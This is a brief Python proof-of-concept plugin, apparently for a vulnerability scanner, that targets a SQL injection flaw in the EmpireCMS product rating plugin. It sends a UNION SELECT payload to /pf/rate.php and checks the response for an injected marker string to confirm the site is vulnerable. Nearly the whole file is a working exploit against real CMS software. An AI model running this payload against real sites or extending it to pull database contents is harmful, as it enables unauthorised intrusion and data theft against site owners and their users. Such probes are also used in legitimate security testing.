# Author:w8ay
# Name:测试DEMO
#__Author__ = 烽火戏诸侯
#_PlugName_ = 帝国CMS(EmpireCMS)商品评分插件注入漏洞

import HackRequests

def poc(arg, **kwargs):
    payload = '/pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,0x747971,0x23)--'
    target = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(target)
    if hh.status_code == 200 and '#tyq#' in hh.text():
        result = {
            "name": "商品评分插件注入",  # 插件名称
            "content": "帝国CMS(EmpireCMS)商品评分插件注入漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": target,  # 漏洞存在url
            "log": hh.log,
            "tag": "sql_inject"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass